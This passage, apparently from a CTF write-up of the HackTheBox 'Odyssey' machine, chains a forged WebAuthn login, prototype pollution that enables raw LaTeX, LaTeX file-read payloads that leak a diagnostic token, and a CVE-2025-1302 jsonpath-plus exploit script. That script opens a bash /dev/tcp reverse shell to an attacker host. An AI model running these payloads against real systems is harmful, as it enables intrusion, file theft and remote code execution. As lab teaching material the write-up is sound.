    client_hash = hashlib.sha256(client_data).digest()
    message = authenticator_data + client_hash

    return private_key.sign(
        message,
        ec.ECDSA(hashes.SHA256()),
    )


def create_authentication_request(credential_id, authenticator_data,
                                   client_data, signature, account_id):
    """Assemble the WebAuthn authentication response."""

    return {
        "id": websafe_encode(credential_id),
        "rawId": websafe_encode(credential_id),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(client_data),
            "authenticatorData": websafe_encode(authenticator_data),
            "signature": websafe_encode(signature),
            "userHandle": websafe_encode(account_id),
        },
        "clientExtensionResults": {},
    }


def authenticate():
    credential = read_credential(CREDENTIAL_FILE)

    secret_key = credential["private_key"]
    credential_id = credential["credential_id"]
    registered_user = credential["user_id"]

    requested_user = b"admin"

    print(f"[*] Loaded credential belonging to: {registered_user.decode()}")
    print(f"[*] Preparing authentication request for: {requested_user.decode()}")

    connection = requests.Session()

    # Request a fresh WebAuthn challenge.
    begin = connection.post(
        f"{SERVER}/api/v1/auth/webauthn/auth/begin",
        json={},
    )
    begin.raise_for_status()

    challenge = websafe_decode(
        begin.json()["challenge"]
    )

    print("[*] Received authentication challenge")

    # Construct the authenticator assertion.
    authenticator_data = construct_authenticator_data()
    browser_data = construct_client_data(challenge)

    signature = generate_assertion_signature(
        secret_key,
        authenticator_data,
        browser_data,
    )

    request_body = create_authentication_request(
        credential_id,
        authenticator_data,
        browser_data,
        signature,
        requested_user,
    )

    # Submit the assertion.
    completed = connection.post(
        f"{SERVER}/api/v1/auth/webauthn/auth/finish",
        json=request_body,
    )

    print(f"[*] Authentication server returned HTTP {completed.status_code}")

    if not completed.ok:
        print(f"[!] Authentication failed: {completed.text}")

    completed.raise_for_status()

    session_id = connection.cookies.get("aegis.sid")

    print("[+] Authentication completed successfully")
    print(f"[+] Session cookie: aegis.sid={session_id}")


if __name__ == "__main__":
    authenticate()
```

The script first loads the previously saved private key, credential ID, and user ID from `aegis_cred.pkl`. It then requests a fresh WebAuthn challenge from `/api/v1/auth/webauthn/auth/begin`. Using that challenge, it constructs the required `clientDataJSON` and `authenticatorData`, calculates the appropriate hashes, and signs the authentication data with the stored private key.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ python3 login.py   
[*] Loaded credential belonging to: op-2026-0042
[*] Preparing authentication request for: admin
[*] Received authentication challenge
[*] Authentication server returned HTTP 200
[+] Authentication completed successfully
[+] Session cookie: aegis.sid=s%3AzsV5Siz0InoF-3jFoAdOsw677qTL-8qq.oRKW%2FGEEw1%2FDIKxNlnkQKldQtnAwYH4horcna9LHTIk
```

Once the assertion has been generated, the script packages the credential ID, client data, authenticator data, signature, and requested user handle into the format expected by the `/api/v1/auth/webauthn/auth/finish` endpoint. The completed request is then sent directly to the server, and the script checks whether authentication was successful. If the server accepts the assertion, the HTTP session contains the `aegis.sid` cookie, which represents the authenticated application session. This effectively allows the script to perform the WebAuthn login flow programmatically instead of using the browser's WebAuthn interface.

After obtaining the session cookie, we can import it into our browser and use it to access the application as an authenticated user. This allows us to reach the dashboard without going through the normal login process.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOgF4LANsOx9k3q5mYVyb%252FScreenshot%2520%283376%29.png%3Falt%3Dmedia%26token%3D88e875e3-4a3f-4e44-8256-41ad3526cd0b&width=768&dpr=3&quality=100&sign=e107c82750106880d71da8a8fc7e5936&sv=3)

# Prototype Pollution–Based Raw-Block File Read

After gaining access to the admin dashboard, we can review the different sections available to our account. Most of the panels, including the **Operator Roster** and **Authorization Queue**, do not reveal anything immediately useful for further exploitation. The **Notice Templates** section, however, looks more promising from an enumeration perspective, so we focus our attention there. Opening one of the existing templates allows us to inspect its contents and determine whether the editing functionality exposes anything interesting.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FU32kCr6kQPqPOBwv3WBE%252FScreenshot%2520%283377%29.png%3Falt%3Dmedia%26token%3D916be345-43e9-4a2b-809c-6b8948e22ecc&width=768&dpr=3&quality=100&sign=60313d54bad7924dd49bc7a4804a9651&sv=3)

The structure of the editable notice strongly suggests that the application is using a server-side template engine to generate the final content. To determine whether the template fields are being evaluated dynamically, we can perform a simple test by replacing a value such as `officer.handle` with an arithmetic expression like `7*7`. After saving the changes as a draft, we can use the preview function and observe how the application processes the modified template.

However, the result does not immediately confirm whether the expression was evaluated. Instead of displaying the rendered notice itself, the preview returns a **render workflow log** containing information about the rendering process. This means we need to examine how the preview mechanism works and determine whether the template content is being processed somewhere else before we can confirm the presence of a template injection vulnerability.

```plaintext
✓ render OK · 2174ms
artifact: /var/lib/aegis-render/jobs/job-1789513977432-ed18a9f6/notice.final.pdf

[nunjucks code=0 8ms]


[pandoc code=0 357ms]


[pdflatex code=1 696ms]
This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025/Debian) (preloaded format=pdflatex 2026.5.5)  15 SEP 2026 23:12
entering extended mode
 %&-line parsing enabled.
**/var/lib/aegis-render/jobs/job-1789513977432-ed18a9f6/notice.tex
(/var/lib/aegis-render/jobs/job-1789513977432-ed18a9f6/notice.tex
LaTeX2e <2025-11-01>
L3 programming layer <2026-01-19>
(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
Document Class: article 2025/01/22 v1.4n Standard LaTeX document class
(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo
File: size10.clo 2025/01/22 v1.4n Standard LaTeX file (size option)
)
\c@part=\count275
\c@section=\count276
\c@subsection=\count277
\c@subsubsection=\count278
\c@paragraph=\count279
\c@subparagraph=\count280
\c@figure=\count281
\c@table=\count282
\abovecaptionskip=\skip49
\belowcaptionskip=\skip50
\bibindent=\dimen148
) (/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
Package: geometry 2020/01/02 v5.9 Page Geometry
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty
Package: keyval 2022/05/29 v1.15 key=value parser (DPC)
\KV@toks@=\toks17
) (/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
Package: ifvtex 2019/10/25 v1.7 ifvtex legacy package. Use iftex instead.
(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty
Package: iftex 2024/12/12 v1.0g TeX engine tests
))
\Gm@cnth=\count283
\Gm@cntv=\count284
\c@Gm@tempcnt=\count285
\Gm@bindingoffset=\dimen149
\Gm@wd@mp=\dimen150
\Gm@odd@mp=\dimen151
\Gm@even@mp=\dimen152
\Gm@layoutwidth=\dimen153
\Gm@layoutheight=\dimen154
\Gm@layouthoffset=\dimen155
\Gm@layoutvoffset=\dimen156
\Gm@dimlist=\toks18
) (/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
Package: fontenc 2025/07/18 v2.1d Standard LaTeX package
) (/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty
Package: inputenc 2024/02/08 v1.3d Input encoding file
\inpenc@prehook=\toks19
\inpenc@posthook=\toks20
) (/usr/share/texmf/tex/latex/lm/lmodern.sty
Package: lmodern 2015/05/01 v1.6.1 Latin Modern Fonts
LaTeX Font Info:    Overwriting symbol font `operators' in version `normal'
(Font)                  OT1/cmr/m/n --> OT1/lmr/m/n on input line 22.
LaTeX Font Info:    Overwriting symbol font `letters' in version `normal'
(Font)                  OML/cmm/m/it --> OML/lmm/m/it on input line 23.
LaTeX Font Info:    Overwriting symbol font `symbols' in version `normal'
(Font)                  OMS/cmsy/m/n --> OMS/lmsy/m/n on input line 24.
LaTeX Font Info:    Overwriting symbol font `largesymbols' in version `normal'
(Font)                  OMX/cmex/m/n --> OMX/lmex/m/n on input line 25.
LaTeX Font Info:    Overwriting symbol font `operators' in version `bold'
(Font)                  OT1/cmr/bx/n --> OT1/lmr/bx/n on input line 26.
LaTeX Font Info:    Overwriting symbol font `letters' in version `bold'
(Font)                  OML/cmm/b/it --> OML/lmm/b/it on input line 27.
LaTeX Font Info:    Overwriting symbol font `symbols' in version `bold'
(Font)                  OMS/cmsy/b/n --> OMS/lmsy/b/n on input line 28.
LaTeX Font Info:    Overwriting symbol font `largesymbols' in version `bold'
(Font)                  OMX/cmex/m/n --> OMX/lmex/m/n on input line 29.
LaTeX Font Info:    Overwriting math alphabet `\mathbf' in version `normal'
(Font)                  OT1/cmr/bx/n --> OT1/lmr/bx/n on input line 31.
LaTeX Font Info:    Overwriting math alphabet `\mathsf' in version `normal'
(Font)                  OT1/cmss/m/n --> OT1/lmss/m/n on input line 32.
LaTeX Font Info:    Overwriting math alphabet `\mathit' in version `normal'
(Font)                  OT1/cmr/m/it --> OT1/lmr/m/it on input line 33.
LaTeX Font Info:    Overwriting math alphabet `\mathtt' in version `normal'
(Font)                  OT1/cmtt/m/n --> OT1/lmtt/m/n on input line 34.
LaTeX Font Info:    Overwriting math alphabet `\mathbf' in version `bold'
(Font)                  OT1/cmr/bx/n --> OT1/lmr/bx/n on input line 35.
LaTeX Font Info:    Overwriting math alphabet `\mathsf' in version `bold'
(Font)                  OT1/cmss/bx/n --> OT1/lmss/bx/n on input line 36.
LaTeX Font Info:    Overwriting math alphabet `\mathit' in version `bold'
(Font)                  OT1/cmr/bx/it --> OT1/lmr/bx/it on input line 37.
LaTeX Font Info:    Overwriting math alphabet `\mathtt' in version `bold'
(Font)                  OT1/cmtt/m/n --> OT1/lmtt/m/n on input line 38.
) (/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty
Package: fancyhdr 2025/02/07 v5.2 Extensive control of page headers and footers
\f@nch@headwidth=\skip51
\f@nch@offset@elh=\skip52
...
```

Looking at the request to `/admin/templates/firmware-critical-v4/render` through BurpSuite gives us a much clearer view of what happens behind the scenes. The response is still quite large, but unlike the browser's preview, it provides a structured JSON object containing the individual stages involved in generating the final document.

```json
{
  "ok": true,
  "finalStage": "gs",
  "artifactPath": "/var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/notice.final.pdf",
  "durationMs": 343,
  "stages": [
    {
      "stage": "nunjucks",
      "code": 0,
      "durationMs": 6,
      "stderr": "",
      "stdout": ""
    },
    {
      "stage": "pandoc",
      "code": 0,
      "durationMs": 24,
      "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/authcert.tex -o /var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/notice.tex /var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/notice.md",
      "stderr": "",
      "stdout": ""
    },
    {
      "stage": "pdflatex",
      "code": 1,
      "durationMs": 118,
      "cmd": "..."
    },
    {
      "stage": "dvips",
      "code": 0,
      "durationMs": 19,
      "cmd": "/usr/bin/dvips -q -o /var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/notice.ps /var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/notice.dvi",
      "stderr": "",
      "stdout": ""
    },
    {
      "stage": "gs",
      "code": 0,
      "durationMs": 63,
      "cmd": "/usr/bin/gs -dBATCH -dNOPAUSE -dSAFER -dQUIET -sDEVICE=pdfwrite -sOutputFile=/var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/notice.final.pdf /var/lib/aegis-render/jobs/job-1789514279316-c6c60cf6/notice.ps",
      "stderr": "",
      "stdout": ""
    }
  ]
}
```

The response reveals a multi-stage rendering pipeline. Most importantly, we can see that **Nunjucks** is executed first, confirming that the template is processed by the Nunjucks template engine. The resulting content is then passed through **Pandoc**, which converts the Markdown into LaTeX, followed by **pdflatex**, **dvips**, and finally **Ghostscript (`gs`)**, which produces the final PDF artifact. The response also exposes internal file paths and execution details for several of these stages. This gives us a much better understanding of the application's backend rendering workflow and, more importantly, confirms that our template input is being processed by Nunjucks before the document is generated.

Looking back at the template editor, we can identify an important piece of Nunjucks syntax inside the template body:

```jinja
{{ overrides | merge(defaults) | json }}
```

The use of the `merge` filter immediately raises the possibility of prototype pollution. Research into JavaScript merge operations shows that recursive object merging can become dangerous when attacker-controlled properties such as `__proto__` are accepted. For example, an object containing a property like the following can modify the inherited properties of other JavaScript objects:

```json
{
  "__proto__": {
    "polluted": true
  }
}
```

The important concept here is that JavaScript objects inherit properties through the prototype chain. If a property does not exist directly on an object, JavaScript can continue searching through its prototype until it reaches `Object.prototype`. Therefore, if a property is successfully added to `Object.prototype`, otherwise unrelated objects may also appear to contain that property.

However, simply adding a property to the prototype does not necessarily mean that we will see an obvious change in the application's response. Prototype pollution often needs a **behavioral oracle**—some observable application behavior that changes when the polluted property is present. With that in mind, the next step is to identify a property that could influence one of the application's backend operations.

One particularly interesting property can be found in the template's `overrides` object:

```json
{
  "audience": "internal",
  "allowRawBlocks": false,
  "ceremony_witness": "s.vrana"
}
```

The `allowRawBlocks` setting immediately stands out because it controls whether raw content can be passed through during document rendering. We can correlate this with another useful discovery from the render log: the application exposes the exact command being used to invoke Pandoc.

```json
{
  "stage": "pandoc",
  "code": 0,
  "durationMs": 37,
  "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/authcert.tex -o /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.tex /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.md",
  "stderr": "",
  "stdout": ""
}
```

Looking at Pandoc's documentation, we can see that `raw_attribute` controls whether raw content annotated with a specific format is preserved and passed directly into the output. The important detail here is the `-` prefix in `--from markdown-raw_attribute`, which explicitly disables that extension. Conversely, changing it to `markdown+raw_attribute` enables the functionality.

This gives us a useful chain between the two discoveries. If we can somehow make the application's `allowRawBlocks` value evaluate to `true`, it may cause the renderer to enable the `raw_attribute` extension. Simply changing the value directly in the `overrides` object, however, does not appear to have any effect. This suggests that the value may be controlled or overwritten by the application's default object, making it a good candidate for testing prototype pollution.

We can therefore modify the overrides object to inject the property through `__proto__`:

```json
{
  "__proto__": {
    "allowRawBlocks": true
  }
}
```

After rendering the template with this modified input, the behavior changes as expected. The Pandoc command now contains `+raw_attribute` instead of `-raw_attribute`:

```json
{
  "stage": "pandoc",
  "code": 0,
  "durationMs": 37,
  "cmd": "/usr/bin/pandoc --from markdown+raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/authcert.tex -o /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.tex /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.md",
  "stderr": "",
  "stdout": ""
}
```

This behavioral change gives us strong confirmation that the prototype pollution is working. By injecting `allowRawBlocks` through `__proto__`, we influenced a property used later in the rendering process, causing the application to enable Pandoc's raw attribute support.

With raw LaTeX now being accepted by the Markdown-to-LaTeX conversion stage, we can investigate what impact this gives us. Direct command-execution techniques in LaTeX are not immediately useful here because the application invokes `pdflatex` and `latex` with `--no-shell-escape`. Ghostscript is also executed with `-dSAFER`, providing another restriction against straightforward command execution.

Instead of immediately pursuing code execution, a more practical next step is to determine whether we can access files on the underlying system. LaTeX provides several mechanisms for including external files, with `\input` being one of the simplest to test. We can use `/etc/passwd` as a harmless proof of concept to determine whether the newly enabled raw LaTeX functionality actually causes the renderer to process local file contents.

We append the following to the template body:

```latex
`\input{/etc/passwd}`{=latex}
```

If the renderer processes the raw block successfully, the contents of `/etc/passwd` should be incorporated into the generated document, confirming that the prototype-pollution primitive can be chained into local file disclosure.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FkAji3kHXHcqHsJj7pQNb%252FScreenshot%2520%283379%29.png%3Falt%3Dmedia%26token%3D1b87c429-1c0d-49bc-b365-6e79e8fd5a1d&width=768&dpr=3&quality=100&sign=5450a11855f286327288864614cee0e2&sv=3)

At this point, we have confirmed that the LaTeX primitive can be abused to access local files. However, the output produced by `\input` is not particularly clean. The contents of `/etc/passwd` are still recognizable, but parts of the file are altered by TeX's rendering process. This becomes a problem when attempting to read files containing information that needs to remain exactly as it appears on disk.

The next file we would like to inspect is `/proc/self/cgroup`. This can potentially provide information about the environment in which the application is running, which may help us identify the service or container associated with the renderer. From there, we could potentially determine where the application's files are located and begin examining its backend source code.

Unfortunately, using `\input` against `/proc/self/cgroup` does not give us a useful result. The reason becomes clearer when looking at how TeX handles `\input`: the contents are not simply returned as raw text. Instead, TeX treats the file as document content and sends it through its typesetting engine. This introduces font-selection commands, line wrapping, character interpretation, and other transformations. As a result, characters can be modified or represented differently, while long lines may be broken by the paragraph-building process.

For example, output may contain fragments similar to:

```
\OML/lmm/m/it/10
```

and characters such as `/` may not necessarily appear exactly as they were stored in the original file. Therefore, although `\input` proves that file access is possible, it is not a reliable method for retrieving arbitrary files in their original form.

Searching for ways to perform file reads in LaTeX without passing the contents through the typesetting engine leads us to TeX's lower-level file I/O primitives. Research by Checkoway and Shacham describes how TeX provides operations such as `\openin`, `\read`, `\write`, and `\closein` that can interact with files independently of the normal document-rendering process. The important distinction is that `\read` can retrieve a line from a file and store it inside a macro rather than immediately typesetting it.

This gives us a much cleaner approach. Instead of using `\input` to insert the file directly into the document, we can open the target file, read it line by line, and send the resulting strings into the TeX log. The relevant primitives can be combined into the following payload:

```latex
\newread\foo
\openin\foo=<TARGET_FILE>
\loop
  \unless\ifeof\foo
    \read\foo to \line
    \message{^^J<<<\meaning\line>>>^^J}
\repeat
\closein\foo
```

The individual components of the payload work together as follows:

* `\newread\foo` creates a new TeX input stream named `foo`.
* `\openin\foo=<TARGET_FILE>` opens the target file through that input stream.
* `\loop` begins repeatedly processing the file.
* `\unless\ifeof\foo` keeps the loop running until the end of the file is reached.
* `\read\foo to \line` retrieves one line from the file and stores it in the `\line` macro.
* `\message{...}` sends the extracted data to TeX's log/output stream instead of typesetting it into the document.
* `^^J` represents a newline, while the `<<<` markers make the extracted lines easier to identify in the resulting output.
* `\meaning\line` obtains TeX's representation of the macro, allowing us to inspect the stored contents without having TeX interpret them as document commands.
* `\repeat` returns to the beginning of the loop while additional data remains.
* `\closein\foo` closes the file stream once the entire file has been processed.

This approach avoids the formatting problems caused by `\input` and gives us access to the file contents through the renderer's log output. Using the payload against `/proc/self/cgroup`, we can successfully retrieve the file in a much more usable form, giving us another source of information about the environment running the application.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUuVAOZmGdxljblw0WE2A%252FScreenshot%2520%283381%29.png%3Falt%3Dmedia%26token%3Dc718f54e-d310-48a0-8b3b-d80214df273a&width=768&dpr=3&quality=100&sign=bb3f71cf3bdfb524f3824798a0b5f030&sv=3)

From the information obtained in `/proc/self/cgroup`, we can identify the application process as **`aegis.service`**. With the service name established, the next step is to inspect its systemd unit file at `/etc/systemd/system/aegis.service`. This should provide details about how the application is launched and, importantly, help us determine the location of its webroot and backend files.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FLWy2naJLYzmpOrnOQbhk%252FScreenshot%2520%283382%29.png%3Falt%3Dmedia%26token%3D1be0535b-39a2-487e-9aa8-19a63f52c5bb&width=768&dpr=3&quality=100&sign=ce3bba4827d87a2d5e84f8427201958b&sv=3)

Inspecting the service configuration reveals that the AEGIS application is installed under `/home/webadmin/aegis`. Now that we have identified the application's working directory, we can move on to examining its main backend entry point, `server.js`, to better understand how the application is implemented and identify potential weaknesses.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FkxRlAPvc10Fazuw5GvUf%252FScreenshot%2520%283384%29.png%3Falt%3Dmedia%26token%3Da8954f68-1149-4886-acd5-eae86ac4d3f5&width=768&dpr=3&quality=100&sign=a31d4f9f32bf583843a8ed56c7c61595&sv=3)

The output obtained through the LaTeX file-reading primitive is difficult to read directly because of the formatting introduced by TeX. After cleaning up the extracted text, however, we can reconstruct the application's `server.js` file. This immediately gives us a much better understanding of how the AEGIS backend is structured.

```javascript
const path = require('path');
const express = require('express');
const session = require('express-session');
const nunjucks = require('nunjucks');
const mongo = require('./db/mongo');
const sql = require('./db/sql');
const MssqlSessionStore = require('./lib/sql_session_store');

const app = express();

const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

app.set('trust proxy', 1);

const env = nunjucks.configure(
    path.join(__dirname, 'views'),
    {
        autoescape: true,
        express: app,
        noCache: true,
    }
);

env.addGlobal(
    'CLASSIFICATION',
    'TOP SECRET // KORVIA EYES ONLY // D9-RESTRICTED'
);

env.addGlobal('SYSTEM', {
    name: 'AEGIS',
    longName: 'Sovereign Signing & Attestation Authority',
    agency: 'Directorate 9',
    build: '7.4.2-prod',
    node: 'aegis-prod-01',
});

const AEGIS_HOST = 'aegis.korvia.htb';

app.use((req, res, next) => {
    const host = (req.headers.host || '').replace(/:.*/, '');

    if (host !== AEGIS_HOST) {
        return res.redirect(
            301,
            'http://' + AEGIS_HOST + ':' + PORT + req.originalUrl
        );
    }

    next();
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(
    session({
        name: 'aegis.sid',
        secret:
            process.env.AEGIS_SESSION_SECRET ||
            'aegis-prod-fixed-secret-d9-restricted-do-not-rotate',
        store: new MssqlSessionStore({
            ttlMs: 30 * 24 * 60 * 60 * 1000,
        }),
        resave: false,
        saveUninitialized: false,
        rolling: true,
        cookie: {
            httpOnly: true,
            sameSite: 'lax',
            maxAge: 30 * 24 * 60 * 60 * 1000,
        },
    })
);

app.use((req, res, next) => {
    res.locals.path = req.path;

    if (req.session && req.session.userId) {
        res.locals.user = {
            id: req.session.userId,
            handle: req.session.userHandle,
            role: req.session.userRole,
        };
    } else {
        res.locals.user = null;
    }

    next();
});

app.use('/', require('./routes/mds'));
app.use('/', require('./routes/mds_diag'));
app.use('/', require('./routes/onboard'));
app.use('/', require('./routes/webauthn'));
app.use('/', require('./routes/templates'));
app.use('/', require('./routes/index'));
```

One route immediately stands out from this list:

```javascript
app.use('/', require('./routes/mds_diag'));
```

We had not encountered `mds_diag` during our previous enumeration, so this becomes an interesting target for further investigation. Since we already have a working file-read primitive, we can retrieve `/home/webadmin/aegis/routes/mds_diag.js` and reconstruct the relevant portions of that source as well.

```javascript
'use strict';

const express = require('express');
const router = express.Router();

const { JSONPath } = require('jsonpath-plus');
const sql = require('../db/sql');
const { getDb } = require('../db/mongo');
const profiles = require('../lib/mds_diag_profiles');

const TOKEN = process.env.MDS_DIAG_TOKEN || '';

if (!TOKEN) {
    console.warn(
        '[mds-diag] no token loaded; populate ' +
        '/etc/aegis-mds-diag.env to set MDS_DIAG_TOKEN'
    );
}

router.post(
    '/api/v1/aegis-mds/_diag/:token/jpquery',
    express.json({ limit: '32kb' }),
    async (req, res) => {

        if (!TOKEN || req.params.token !== TOKEN) {
            return res.status(404).render('error.njk', {
                code: 404,
                title: 'Resource Not Located',
                detail:
                    'The requested object does not exist ' +
                    'or your clearance is insufficient.',
            });
        }

        const body = req.body || {};
        const expr = body.expr;

        const context =
            typeof body.context === 'string'
                ? body.context
                : 'registration';

        const err = preflight(expr);

        // ...

        const DEFAULT_JP_OPTS = {
            eval: 'safe',
            wrap: false,
            flatten: false,
            resultType: 'value',
            preventEval: false,
        };

        const opts = Object.assign(
            {},
            DEFAULT_JP_OPTS,
            profile.jpOpts,
            {
                path: expr,
                json: snapshot,
            }
        );

        let matches = [];
        let status = 'ok';
        let errorDetail = null;

        try {
            matches = JSONPath(opts);

            if (!Array.isArray(matches)) {
                matches =
                    matches === undefined
                        ? []
                        : [matches];
            }
        } catch (e) {
            status = 'error';
            errorDetail =
                e && e.message
                    ? e.message
                    : String(e);
        }
    }
);
```

There are two particularly important findings in this source. First, the application exposes a diagnostic endpoint that accepts a JSONPath expression through `jpquery`. Access to the endpoint is protected by a token stored in the `MDS_DIAG_TOKEN` environment variable. Second, the endpoint uses the `jsonpath-plus` package to process the supplied expression, with the JSONPath configuration explicitly containing `eval: 'safe'`.

The source also tells us exactly where the token is expected to come from:

```
/etc/aegis-mds-diag.env
```

Since our file-reading primitive allows us to inspect local files, we can retrieve that file and recover the diagnostic token:

```
MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
```

At this point, we have the authentication material required to interact with the diagnostic endpoint. The next question is whether the particular `jsonpath-plus` version used by the application contains a vulnerability that can be reached through this functionality.

The application's `package.json` provides the dependency versions:

```json
{
  "name": "aegis",
  "version": "0.1.0",
  "private": true,
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "node --watch server.js"
  },
  "dependencies": {
    "@simplewebauthn/server": "^10.0.1",
    "express": "^4.21.0",
    "express-session": "^1.19.0",
    "jsonpath-plus": "^10.2.0",
    "mongodb": "^7.2.0",
    "mssql": "^12.5.0",
    "nunjucks": "^3.2.4"
  }
}
```

The dependency information gives us another useful lead: the application is using `jsonpath-plus` version `10.2.0`. Research into vulnerabilities affecting this package reveals a proof of concept involving unsafe evaluation behavior in vulnerable configurations. The important connection is that we now have all the necessary pieces: an exposed JSONPath endpoint, a valid diagnostic token, the exact package version, and application-controlled JSONPath evaluation.

Rather than treating the vulnerability in isolation, we can connect it back to everything discovered so far. The template-rendering weakness first gave us arbitrary local file reads as the `webadmin` user. We then used that capability to retrieve the application's source code and diagnostic configuration, revealing both the hidden `jpquery` endpoint and the token required to access it. Finally, examining `package.json` showed that the application uses a vulnerable version of `jsonpath-plus` associated with **CVE-2025-1302**.

This gives us a clear attack chain: the initial template injection leads to local file disclosure, which exposes the application's internal functionality and credentials, ultimately allowing us to reach a vulnerable JSONPath implementation. By leveraging **CVE-2025-1302** against the exposed diagnostic functionality, we can progress from file disclosure to code execution in the context of the `webadmin` account.

```python
#!/usr/bin/env python3

import base64
import requests


DIAGNOSTIC_TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"

HOST = "10.10.15.121"
PORT = 9001

API_ENDPOINT = (
    "http://aegis.korvia.htb:3000"
    f"/api/v1/aegis-mds/_diag/{DIAGNOSTIC_TOKEN}/jpquery"
)


def encode_command(command):
    """Encode the supplied command using Base64."""

    raw_data = command.encode()
    return base64.b64encode(raw_data).decode()


def build_expression(encoded_command):
    """Construct the vulnerable JPQuery expression."""

    javascript = (
        "this.process.mainModule.require('child_process')"
        f".exec('echo {encoded_command}|base64 -d|bash')"
    )

    return (
        f'$..[?(p="{javascript}";'
        "Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )


def send_request(expression):
    """Submit the crafted expression to the diagnostic endpoint."""

    payload = {
        "context": "registration",
        "expr": expression,
    }

    return requests.post(
        API_ENDPOINT,
        json=payload,
        timeout=5,
    )


def main():
    shell_command = (
        f"bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1"
    )

    encoded_payload = encode_command(shell_command)
    query_expression = build_expression(encoded_payload)

    print("[*] Sending diagnostic query...")

    try:
        response = send_request(query_expression)

        print(f"[+] HTTP status: {response.status_code}")
        print(f"[+] Server output: {response.text[:200]}")

    except requests.RequestException as error:
        print(f"[!] Request failed: {error}")


if __name__ == "__main__":
    main()
```

The script automates exploitation of the vulnerable AEGIS diagnostic endpoint. It first defines the diagnostic token and the listener address, then constructs the `jpquery` API URL. The reverse-shell command is generated using the configured host and port and encoded with Base64 so it can be safely embedded inside the JavaScript payload. The `build_expression()` function then creates the malicious JSONPath expression that abuses the vulnerable `jsonpath-plus` evaluation behavior. Within that expression, Node.js's `child_process` module is accessed and `exec()` is used to execute the decoded shell command.

Finally, the script places the crafted expression inside the `expr` parameter and submits it as a JSON POST request to the diagnostic endpoint. If the vulnerable JSONPath processing executes the injected JavaScript successfully, the target runs the decoded Bash command and attempts to establish the reverse-shell connection. In the context of the attack chain, this represents the transition from the earlier template-injection-based file disclosure to **remote code execution as the `webadmin` user**, leveraging the vulnerable diagnostic functionality and `jsonpath-plus` implementation.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.45.209] 61290
bash: cannot set terminal process group (1502): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@odyssey-web:~/aegis$ 
```

And we've got a shell as `webadmin`!

# Lateral Movement to Odyssey-DB

## Password Reuse for Root Access and Initial Enumeration

While continuing the manual enumeration of the application source code, we discover several files containing potentially useful credentials. One of them is `/home/webadmin/aegis/db/sql.js`, which contains the configuration used by the application to connect to its MSSQL database:

```javascript
webadmin@odyssey-web:~/aegis/db$ cat sql.js
cat sql.js
const sql = require('mssql');

const config = {
  user: process.env.AEGIS_SQL_USER || 'odyssey_app',
